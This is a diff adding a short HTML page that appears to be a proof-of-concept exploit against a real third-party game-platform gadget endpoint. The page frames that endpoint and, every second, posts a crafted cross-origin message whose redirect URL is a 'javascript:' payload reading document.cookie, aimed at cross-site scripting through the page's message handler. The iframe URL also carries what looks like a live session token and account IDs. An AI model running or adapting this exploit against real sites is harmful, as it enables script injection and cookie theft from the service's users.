@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Immediate postMessage via iframe</title>
+</head>
+<body>
+  <iframe id="targetFrame" 
+          src="https://osapi.nutaku.com/gadgets/ifr?synd=nutaku&container=nutaku&country=US&lang=en&mid=1&owner=173250875&viewer=173250875&aid=70059&tid=kamihime&view=canvas&parent=https%3A%2F%2Fwww.nutaku.com&noinfo=0&nocache=0&debug=1&view-params=&st=7WQA9FJ%2FItPi0ii3ozw5VjT3Oq8ApMKQU%2BaidYsI6weyj66Kqu34Df44HZGx4hA7aVYs79fFuVctwfWo%2BESa0T3SF%2FUgPHF8UT8mnMuKgZ6OEhWHBV2E36FaAUnipw%2FY2i68R5h%2FgbLQZ6iSL0rXbb3pv1rx6nbM8DSVIAgvh06Lw2e2NVxp0XKo6%2BogV4rXDlqcleH3bFmnDOyEW5ArJ0DwxzVQrf2TBlTzFij2XSbO59LSccaFDgYk76Dx5R1GjAi2uQ%3D%3D&domain=https%3A%2F%2Fwww.nutaku.com" 
+          style="width:900px; height:700px; border:1px solid #ccc;"></iframe>
+
+  <script>
+    const iframe = document.getElementById('targetFrame');
+    const payload = JSON.stringify(["redirectURL", ["javascript:alert(document.cookie)"], "paymentResponse"]);
+    const INTERVAL_MS = 1000;
+
+    let sendIntervalId = null;
+
+    // Function to send message
+    function sendMessage() {
+      if (!iframe.contentWindow) {
+        console.warn('iframe not ready yet');
+        return;
+      }
+
+      try {
+        iframe.contentWindow.postMessage(payload, "*");
+        console.log('posted:', payload);
+      } catch (err) {
+        console.error('postMessage error:', err);
+      }
+    }
+
+    // Immediately attempt once
+    sendMessage();
+
+    // Repeat sending every second
+    sendIntervalId = setInterval(sendMessage, INTERVAL_MS);
+
+    // Cleanup on navigation
+    window.addEventListener('beforeunload', () => {
+      if (sendIntervalId) clearInterval(sendIntervalId);
+    });
+  </script>
+</body>
+</html>
